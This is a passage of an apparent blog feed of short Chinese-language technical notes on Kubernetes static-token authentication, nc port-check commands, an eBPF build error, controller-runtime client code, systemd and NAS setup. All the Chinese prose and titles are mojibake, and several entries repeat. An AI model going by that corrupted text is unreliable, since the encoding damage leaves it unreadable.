--insecure</span><br>&#123;<br>  <span class="hljs-string">&quot;kind&quot;</span>: <span class="hljs-string">&quot;Status&quot;</span>,<br>  <span class="hljs-string">&quot;apiVersion&quot;</span>: <span class="hljs-string">&quot;v1&quot;</span>,<br>  <span class="hljs-string">&quot;metadata&quot;</span>: &#123;&#125;,<br>  <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;Failure&quot;</span>,<br>  <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;nodes is forbidden: User \&quot;system:admin\&quot; cannot list resource \&quot;nodes\&quot; in API group \&quot;\&quot; at the cluster scope&quot;</span>,<br>  <span class="hljs-string">&quot;reason&quot;</span>: <span class="hljs-string">&quot;Forbidden&quot;</span>,<br>  <span class="hljs-string">&quot;details&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;kind&quot;</span>: <span class="hljs-string">&quot;nodes&quot;</span><br>  &#125;,<br>  <span class="hljs-string">&quot;code&quot;</span>: 403<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h2><p>system:mastersæ˜¯k8sä¸­æœ€å¤§æƒé™çš„ç”¨æˆ·ç»„ï¼Œæ‰€ä»¥tokenæ–‡ä»¶ä¸­å°†ç”¨æˆ·å†™æˆsystem:masterså¯ä»¥è·å–åˆ°æ‰€æœ‰èµ„æº</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230509141802.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230509141852.png" alt="image.png"></p><h2 id="ç”Ÿæˆtokençš„æ–¹å¼"><a href="#ç”Ÿæˆtokençš„æ–¹å¼" class="headerlink" title="ç”Ÿæˆtokençš„æ–¹å¼"></a>ç”Ÿæˆtokençš„æ–¹å¼</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">pwd</span><br>/etc/kubernetes<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;`head -c 16 /dev/urandom | od -An -t x | tr -d &#x27; &#x27;`,kubelet-bootstrap,10001,\&quot;system:kubelet-bootstrap\&quot;&quot;</span> &gt; token.csv<br><span class="hljs-built_in">cat</span> token.csv<br><br>ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸Šé¢çš„å‘½ä»¤åœ¨å·¥ä½œä¸­ç”Ÿæˆéšæœºå­—ç¬¦ä¸²<br><span class="hljs-built_in">head</span> -c 16 /dev/urandom | <span class="hljs-built_in">od</span> -An -t x | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> BOOTSTRAP_TOKEN=$(<span class="hljs-built_in">head</span> -c 16 /dev/urandom | <span class="hljs-built_in">od</span> -An -t x | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-built_in">cat</span> &gt; token.csv &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">$&#123;BOOTSTRAP_TOKEN&#125;,kubelet-bootstrap,10001,&quot;system:kubelet-bootstrap&quot;</span><br><span class="hljs-string">EOF</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># head -c 16 /dev/urandom | od -An -t x | tr -d &#x27; &#x27;</span><br>00f87bd9ae7cabc5f6da29534525f84f<br><span class="hljs-comment">## æ•°è¿‡äº†ï¼Œ32ä½</span><br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/authentication/#static-token-file">k8så®˜ç½‘ ç”¨æˆ·è®¤è¯</a><br><a href="https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/rbac/">k8så®˜ç½‘ ä½¿ç”¨ RBAC é‰´æƒ</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
    <tags>
      
      <tag>k8s</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç½‘ç»œæˆé•¿è®°ã€‘ncå¸¸ç”¨å‘½ä»¤</title>
    <link href="/2023/05/06/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91nc%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2023/05/06/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91nc%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">-u, --udp                  Use UDP instead of default TCP<br>-v, --verbose              Set verbosity level (can be used several <span class="hljs-built_in">times</span>)     <br>-z                         Zero-I/O mode, report connection status only    <br>-l, --listen               Bind and listen <span class="hljs-keyword">for</span> incoming connections   <br>-w, --<span class="hljs-built_in">wait</span> &lt;time&gt;          Connect <span class="hljs-built_in">timeout</span> <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -vz -w3 11.254.0.1 443<br><br>nc -luv 0.0.0.0 53<br>nc -uv 0.0.0.0 53<br>nc -uvz 0.0.0.0 53<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ebpfã€‘ç¼–è¯‘</title>
    <link href="/2023/05/04/ebpf/unsupported/%E3%80%90ebpf%E3%80%91%E7%BC%96%E8%AF%91/"/>
    <url>/2023/05/04/ebpf/unsupported/%E3%80%90ebpf%E3%80%91%E7%BC%96%E8%AF%91/</url>
    
    <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># uname -a</span><br>Linux ningan 5.4.0-147-generic <span class="hljs-comment">#164~18.04.1-Ubuntu SMP Tue Apr 4 00:20:20 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><br><span class="hljs-comment"># cat /etc/os-release</span><br>NAME=<span class="hljs-string">&quot;Ubuntu&quot;</span><br>VERSION=<span class="hljs-string">&quot;18.04.6 LTS (Bionic Beaver)&quot;</span><br>ID=ubuntu<br>ID_LIKE=debian<br>PRETTY_NAME=<span class="hljs-string">&quot;Ubuntu 18.04.6 LTS&quot;</span><br>VERSION_ID=<span class="hljs-string">&quot;18.04&quot;</span><br>HOME_URL=<span class="hljs-string">&quot;https://www.ubuntu.com/&quot;</span><br>SUPPORT_URL=<span class="hljs-string">&quot;https://help.ubuntu.com/&quot;</span><br>BUG_REPORT_URL=<span class="hljs-string">&quot;https://bugs.launchpad.net/ubuntu/&quot;</span><br>PRIVACY_POLICY_URL=<span class="hljs-string">&quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&quot;</span><br>VERSION_CODENAME=bionic<br>UBUNTU_CODENAME=bionic<br><br></code></pre></td></tr></table></figure><h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># clang -O2 -g -target bpf -c bpf_sockops.c -o bpf_sockops.o</span><br>In file included from bpf_sockops.c:1:<br>In file included from /usr/include/linux/bpf.h:11:<br>/usr/include/linux/types.h:5:10: fatal error: <span class="hljs-string">&#x27;asm/types.h&#x27;</span> file not found<br><span class="hljs-comment">#include &lt;asm/types.h&gt;</span><br>         ^~~~~~~~~~~~~<br>1 error generated.<br><br></code></pre></td></tr></table></figure><h2 id="è§£å†³åŠæ³•"><a href="#è§£å†³åŠæ³•" class="headerlink" title="è§£å†³åŠæ³•"></a>è§£å†³åŠæ³•</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># apt-get install -y gcc-multilib</span><br></code></pre></td></tr></table></figure><h2 id="å‚å¡"><a href="#å‚å¡" class="headerlink" title="å‚å¡"></a>å‚å¡</h2><p><a href="https://www.ghl.name/archives/how-to-fix-asm-types-h-no-found.html"># Debianä¸‹libbpfç¼–è¯‘å¤±è´¥æç¤º&lt;asm&#x2F;types.h&gt;æ–‡ä»¶ä¸å­˜åœ¨è§£å†³æ–¹æ³•</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘k8så®˜ç½‘å¸¸ç”¨é¡µé¢</title>
    <link href="/2023/04/28/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91k8s%E5%AE%98%E7%BD%91%E5%B8%B8%E7%94%A8%E9%A1%B5%E9%9D%A2/"/>
    <url>/2023/04/28/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91k8s%E5%AE%98%E7%BD%91%E5%B8%B8%E7%94%A8%E9%A1%B5%E9%9D%A2/</url>
    
    <content type="html"><![CDATA[<p><a href="https://kubernetes.io/zh-cn/docs/tasks/administer-cluster/access-cluster-api/"># ä½¿ç”¨ Kubernetes API è®¿é—®é›†ç¾¤</a><br><a href="https://kubernetes.io/docs/reference/kubectl/generated/kubectl_cp/">kubectl cp | Kubernetes</a></p><p>&#x2F;api&#x2F;v1&#x2F;namespaces&#x2F;{namespace}&#x2F;pods<br>&#x2F;apis&#x2F;apps&#x2F;v1&#x2F;namespaces&#x2F;{namespace}&#x2F;replicasets</p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘k8så®˜ç½‘å¸¸ç”¨é¡µé¢</title>
    <link href="/2023/04/28/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91k8s%E5%AE%98%E7%BD%91%E5%B8%B8%E7%94%A8%E9%A1%B5%E9%9D%A2/"/>
    <url>/2023/04/28/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91k8s%E5%AE%98%E7%BD%91%E5%B8%B8%E7%94%A8%E9%A1%B5%E9%9D%A2/</url>
    
    <content type="html"><![CDATA[<p><a href="https://kubernetes.io/zh-cn/docs/tasks/administer-cluster/access-cluster-api/"># ä½¿ç”¨ Kubernetes API è®¿é—®é›†ç¾¤</a></p><p>&#x2F;api&#x2F;v1&#x2F;namespaces&#x2F;{namespace}&#x2F;pods<br>&#x2F;apis&#x2F;apps&#x2F;v1&#x2F;namespaces&#x2F;{namespace}&#x2F;replicasets</p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘clientå®¢æˆ·ç«¯</title>
    <link href="/2023/04/27/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91client%E5%AE%A2%E6%88%B7%E7%AB%AF/"/>
    <url>/2023/04/27/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91client%E5%AE%A2%E6%88%B7%E7%AB%AF/</url>
    
    <content type="html"><![CDATA[<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><br><span class="hljs-string">&quot;sigs.k8s.io/controller-runtime/pkg/client&quot;</span><br><br><span class="hljs-keyword">type</span> Inodes <span class="hljs-keyword">struct</span> &#123;<br>client.Client<br>&#125;<br><br><br>inodesListExpect = xxxx <span class="hljs-comment">// æœ‰å…·ä½“å€¼</span><br><br><br><span class="hljs-comment">// get</span><br>inodes := &amp;irov1.IaasNodes&#123;&#125;<br>err = c.Get(context.TODO(), types.NamespacedName&#123;Name: inodesExpect.Name, Namespace: inodesExpect.Namespace&#125;, inodes)<br><br><span class="hljs-comment">// åˆ›å»º</span><br><span class="hljs-keyword">if</span> err = c.Create(context.TODO(), &amp;inodesExpect); err != <span class="hljs-literal">nil</span> &#123;<br>klog.ErrorS(err, <span class="hljs-string">&quot;Create iaasnodes err&quot;</span>, <span class="hljs-string">&quot;iaasnodes&quot;</span>, iNodeKey)<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-comment">// æ›´æ–°</span><br>inodesExpect.SetResourceVersion(inodes.GetResourceVersion()) <span class="hljs-comment">// å…³è”èµ„æº</span><br><span class="hljs-keyword">if</span> err = c.Update(context.TODO(), &amp;inodesExpect); err != <span class="hljs-literal">nil</span> &#123;<br>klog.ErrorS(err, <span class="hljs-string">&quot;Update iaasnodes err&quot;</span>, <span class="hljs-string">&quot;iaasnodes&quot;</span>, iNodeKey)<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-comment">// list</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘clientå®¢æˆ·ç«¯</title>
    <link href="/2023/04/27/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91client%E5%AE%A2%E6%88%B7%E7%AB%AF/"/>
    <url>/2023/04/27/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91client%E5%AE%A2%E6%88%B7%E7%AB%AF/</url>
    
    <content type="html"><![CDATA[<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><br><span class="hljs-string">&quot;sigs.k8s.io/controller-runtime/pkg/client&quot;</span><br><br><span class="hljs-keyword">type</span> Inodes <span class="hljs-keyword">struct</span> &#123;<br>client.Client<br>&#125;<br><br><br>inodesListExpect = xxxx <span class="hljs-comment">// æœ‰å…·ä½“å€¼</span><br><br><br><span class="hljs-comment">// get</span><br>inodes := &amp;irov1.IaasNodes&#123;&#125;<br>err = c.Get(context.TODO(), types.NamespacedName&#123;Name: inodesExpect.Name, Namespace: inodesExpect.Namespace&#125;, inodes)<br><br><span class="hljs-comment">// åˆ›å»º</span><br><span class="hljs-keyword">if</span> err = c.Create(context.TODO(), &amp;inodesExpect); err != <span class="hljs-literal">nil</span> &#123;<br>klog.ErrorS(err, <span class="hljs-string">&quot;Create iaasnodes err&quot;</span>, <span class="hljs-string">&quot;iaasnodes&quot;</span>, iNodeKey)<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-comment">// æ›´æ–°</span><br>inodesExpect.SetResourceVersion(inodes.GetResourceVersion()) <span class="hljs-comment">// å…³è”èµ„æº</span><br><span class="hljs-keyword">if</span> err = c.Update(context.TODO(), &amp;inodesExpect); err != <span class="hljs-literal">nil</span> &#123;<br>klog.ErrorS(err, <span class="hljs-string">&quot;Update iaasnodes err&quot;</span>, <span class="hljs-string">&quot;iaasnodes&quot;</span>, iNodeKey)<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-comment">// list</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€linuxç³»åˆ—ã€‘(202304) å¸¸ç”¨å‘½ä»¤ï¼šsystemd</title>
    <link href="/2023/04/26/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202304)%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9Asystemd/"/>
    <url>/2023/04/26/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202304)%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9Asystemd/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">## æ£€æŸ¥æœåŠ¡æ˜¯å¦å¼€æœºè‡ªå¯</span><br><span class="hljs-comment"># systemctl list-unit-files  |grep firewalld</span><br>firewalld.service                                                disabled <br><span class="hljs-comment"># systemctl is-enabled firewalld.service</span><br>disabled <br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/dlm_bk/article/details/117324881">https://blog.csdn.net/dlm_bk/article/details/117324881</a></p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sé”™è¯¯è§£å†³ç³»åˆ—ã€‘(202304)metadata.resourceVersion... must be specified for an update</title>
    <link href="/2023/04/24/k8s/%E3%80%90k8s%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E7%B3%BB%E5%88%97%E3%80%91(202304)metadata.resourceVersion...%20must%20be%20specified%20for%20an%20update/"/>
    <url>/2023/04/24/k8s/%E3%80%90k8s%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E7%B3%BB%E5%88%97%E3%80%91(202304)metadata.resourceVersion...%20must%20be%20specified%20for%20an%20update/</url>
    
    <content type="html"><![CDATA[<h1 id="æŠ¥é”™ä¿¡æ¯"><a href="#æŠ¥é”™ä¿¡æ¯" class="headerlink" title="æŠ¥é”™ä¿¡æ¯"></a>æŠ¥é”™ä¿¡æ¯</h1><p>The xxxx is invalid: metadata.resourceVersion: Invalid value: 0x0: must be specified for an update</p><h2 id="è§£å†³åŠæ³•"><a href="#è§£å†³åŠæ³•" class="headerlink" title="è§£å†³åŠæ³•"></a>è§£å†³åŠæ³•</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>getObj, err := dr.Get(obj.GetName(), metav1.GetOptions&#123;&#125;)<br><span class="hljs-keyword">if</span> errors.IsNotFound(err) &#123;<br>// This doesnt ever happen even <span class="hljs-keyword">if</span> it is already deleted or not found<br>log.Printf(<span class="hljs-string">&quot;%v not found&quot;</span>, obj.GetName())<br><span class="hljs-built_in">return</span> nil, nil<br>&#125;<br><br><span class="hljs-keyword">if</span> err != nil &#123;<br><span class="hljs-built_in">return</span> nil, err<br>&#125;<br><br>obj.SetResourceVersion(getObj.GetResourceVersion())<br><br>response, err := dr.Update(obj, metav1.UpdateOptions&#123;&#125;)<br><span class="hljs-keyword">if</span> err != nil &#123;<br><span class="hljs-built_in">return</span> nil, err<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://github.com/argoproj/argo-cd/issues/3657">https://github.com/argoproj/argo-cd/issues/3657</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€nasã€‘nasåˆä½“éªŒ</title>
    <link href="/2023/04/22/nas/%E3%80%90nas%E3%80%91nas%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <url>/2023/04/22/nas/%E3%80%90nas%E3%80%91nas%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="å‡†å¤‡"><a href="#å‡†å¤‡" class="headerlink" title="å‡†å¤‡"></a>å‡†å¤‡</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/35c73430e00cc33ab5c7c9107a36c43.jpg" alt="35c73430e00cc33ab5c7c9107a36c43.jpg"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/4c87ad142cd052519e97a499726941b.jpg" alt="4c87ad142cd052519e97a499726941b.jpg"></p><p>è¿æ¥ç”µæºå’Œç½‘çº¿ï¼Œå°†ç½‘çº¿å¦ä¸€ç«¯æ¥å…¥è·¯ç”±å™¨çš„lanå£</p><h2 id="ä¸‹è½½Synology-Assistant"><a href="#ä¸‹è½½Synology-Assistant" class="headerlink" title="ä¸‹è½½Synology Assistant"></a>ä¸‹è½½Synology Assistant</h2><p>ç¾¤æ™–åŠ©æ‰‹Synology Assistantï¼Œä¸‹è½½å®‰è£…ï¼š<a href="https://imnks.com/go/aHR0cHM6Ly9jbmRsLnN5bm9sb2d5LmNuL2Rvd25sb2FkL1V0aWxpdHkvQXNzaXN0YW50LzYuMi0yNDkyMi9XaW5kb3dzL3N5bm9sb2d5LWFzc2lzdGFudC02LjItMjQ5MjIuZXhl">Windowsç‰ˆæœ¬</a>ï¼Œ<a href="https://imnks.com/go/aHR0cHM6Ly9jbmRsLnN5bm9sb2d5LmNuL2Rvd25sb2FkL1V0aWxpdHkvQXNzaXN0YW50LzYuMi0yNDkyMi9NYWMvc3lub2xvZ3ktYXNzaXN0YW50LTYuMi0yNDkyMi5kbWc">Macç‰ˆæœ¬</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230422201931.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230422185322.png" alt="image.png"></p><p>ç‚¹å‡»â€œåŒæ„â€ â€œç¡®å®šâ€</p><p>è¿›è¡Œç³»ç»Ÿåˆå§‹åŒ–</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230422201246.png" alt="image.png"></p><p>ç‚¹å‡»è®¾ç½®ï¼Œé€‰æ‹©æ‰‹åŠ¨å®‰è£…</p><p><a href="https://www.synology.cn/zh-cn/support/download/DS119j?version=6.2#system">ä¸‹è½½ä¸­å¿ƒ - DS119j | Synology ç¾¤æ™–ç§‘æŠ€</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230422201848.png" alt="image.png"></p><p>å®‰è£…å®Œä¹‹åï¼ŒåŸºæœ¬ä¿¡æ¯å¦‚ä¸‹</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230513001652.png" alt="image.png"></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://imnks.com/597.html">https://imnks.com/597.html</a></p><p><a href="https://imnks.com/mp/">https://imnks.com/mp/</a>   </p>]]></content>
    
    
    <categories>
      
      <category>nas</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€nasã€‘naså¸¸ç”¨æœ¯è¯­</title>
    <link href="/2023/04/22/nas/%E3%80%90nas%E3%80%91nas%E5%B8%B8%E7%94%A8%E6%9C%AF%E8%AF%AD/"/>
    <url>/2023/04/22/nas/%E3%80%90nas%E3%80%91nas%E5%B8%B8%E7%94%A8%E6%9C%AF%E8%AF%AD/</url>
    
    <content type="html"><![CDATA[<p>ç™½ç¾¤æ™–</p>]]></content>
    
    
    <categories>
      
      <category>nas</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€nasã€‘naså¸¸ç”¨æœ¯è¯­</title>
    <link href="/2023/04/22/nas/unsupported/%E3%80%90nas%E3%80%91nas%E5%B8%B8%E7%94%A8%E6%9C%AF%E8%AF%AD/"/>
    <url>/2023/04/22/nas/unsupported/%E3%80%90nas%E3%80%91nas%E5%B8%B8%E7%94%A8%E6%9C%AF%E8%AF%AD/</url>
    
    <content type="html"><![CDATA[<p>ç™½ç¾¤æ™–</p>]]></content>
    
    
    <categories>
      
      <category>nas</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€obsidianç³»åˆ—ã€‘05.obsidianä¸­å¦‚ä½•ç¼–è¾‘è¡¨æ ¼ï¼ŸMarkdown Table Editor</title>
    <link href="/2023/04/07/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9105.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E7%BC%96%E8%BE%91%E8%A1%A8%E6%A0%BC%EF%BC%9FMarkdown%20Table%20Editor/"/>
    <url>/2023/04/07/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9105.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E7%BC%96%E8%BE%91%E8%A1%A8%E6%A0%BC%EF%BC%9FMarkdown%20Table%20Editor/</url>
    
    <content type="html"><![CDATA[<h3 id="å®‰è£…æ’ä»¶"><a href="#å®‰è£…æ’ä»¶" class="headerlink" title="å®‰è£…æ’ä»¶"></a>å®‰è£…æ’ä»¶</h3><p>å·¦ä¸‹è§’è®¾ç½® â€“&gt; ç¬¬ä¸‰æ–¹æ’ä»¶ â€“&gt; ç¤¾åŒºæ’ä»¶å¸‚åœºï¼Œæœç´¢ï¼šMarkdown Table Editor</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230509094257.png" alt="image.png"><br>ç‚¹å‡»å®‰è£…</p><p>åœ¨ä¸‹é¢çš„ä½ç½®å¯ç”¨</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230509094333.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>obsidian</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ebpfã€‘BPFä¹‹å·…-æ´æ‚‰Linuxç³»ç»Ÿå’Œåº”ç”¨æ€§èƒ½</title>
    <link href="/2023/04/06/ebpf/%E3%80%90ebpf%E3%80%91BPF%E4%B9%8B%E5%B7%85-%E6%B4%9E%E6%82%89Linux%E7%B3%BB%E7%BB%9F%E5%92%8C%E5%BA%94%E7%94%A8%E6%80%A7%E8%83%BD/"/>
    <url>/2023/04/06/ebpf/%E3%80%90ebpf%E3%80%91BPF%E4%B9%8B%E5%B7%85-%E6%B4%9E%E6%82%89Linux%E7%B3%BB%E7%BB%9F%E5%92%8C%E5%BA%94%E7%94%A8%E6%80%A7%E8%83%BD/</url>
    
